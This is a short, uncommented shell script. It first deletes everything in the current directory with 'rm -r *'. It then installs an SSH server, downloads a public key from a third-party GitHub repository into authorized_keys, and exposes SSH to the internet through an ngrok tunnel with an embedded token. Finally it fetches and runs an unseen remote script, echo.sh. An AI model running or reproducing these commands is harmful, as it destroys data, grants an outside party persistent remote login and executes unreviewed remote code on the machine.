apt update
rm -r *
apt install sudo -y
apt install openssh-server -y
wget https://raw.githubusercontent.com/Rythwertq/launchdeck/main/id_rsa.pub
mkdir ~/.ssh
mv id_rsa.pub authorized_keys
rm -r ~/.ssh/authorized_keys
cp authorized_keys ~/.ssh
service ssh restart
apt install docker -y
docker pull ngrok/ngrok
docker run --net=host -it -e 25zOFhO9xHS6LJflCnRDtgrWFGl_23YL1E4RHatGeLtdXGh3M=xyz ngrok/ngrok:latest http 22
wget https://raw.githubusercontent.com/Rythwertq/launchdeck/main/echo.sh
chmod 777 echo.sh
./echo.sh
